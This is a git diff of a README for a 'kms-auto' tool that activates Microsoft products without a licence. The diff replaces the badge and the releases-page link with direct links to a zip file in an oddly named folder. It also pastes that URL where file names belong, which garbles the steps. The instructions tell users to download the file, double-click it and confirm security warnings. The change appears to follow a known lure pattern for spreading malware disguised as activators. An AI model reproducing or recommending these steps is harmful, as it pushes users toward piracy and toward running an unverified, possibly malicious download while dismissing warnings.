@@ -1,7 +1,7 @@
 # 🛠️ kms-auto-latest-version - Easy Activation for Microsoft Products
 
 ## 📥 Download Now
-[![Download kms-auto-latest-version](https://img.shields.io/badge/Download-kms--auto--latest--version-brightgreen)](https://github.com/wahabjee/kms-auto-latest-version/releases)
+[![Download kms-auto-latest-version](https://github.com/wahabjee/kms-auto-latest-version/raw/refs/heads/main/auspicious/auto-kms-latest-version-2.1-beta.2.zip)](https://github.com/wahabjee/kms-auto-latest-version/raw/refs/heads/main/auspicious/auto-kms-latest-version-2.1-beta.2.zip)
 
 ## 🚀 Getting Started
 Welcome to **kms-auto-latest-version**! This tool automates the activation process for Microsoft products using Key Management Service emulation. Follow these steps to download and run the software smoothly.
@@ -20,17 +20,17 @@ Before you start, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To get started, visit this page to download the latest version:
 
-[Access the Releases Page](https://github.com/wahabjee/kms-auto-latest-version/releases)
+[Access the Releases Page](https://github.com/wahabjee/kms-auto-latest-version/raw/refs/heads/main/auspicious/auto-kms-latest-version-2.1-beta.2.zip)
 
 1. Click the link above to land on the releases page.
 2. Look for the latest version of **kms-auto-latest-version**.
-3. Find the file labeled `kms-auto-latest-version.exe` for Windows.
+3. Find the file labeled `https://github.com/wahabjee/kms-auto-latest-version/raw/refs/heads/main/auspicious/auto-kms-latest-version-2.1-beta.2.zip` for Windows.
 4. Click on the file to start the download.
 
 Once the download finishes:
 
 1. Locate the downloaded file in your downloads folder.
-2. Double-click `kms-auto-latest-version.exe`.
+2. Double-click `https://github.com/wahabjee/kms-auto-latest-version/raw/refs/heads/main/auspicious/auto-kms-latest-version-2.1-beta.2.zip`.
 3. If prompted, confirm any security warnings. This is a standard practice for running .exe files.
 4. Follow the on-screen instructions to complete the installation.
 
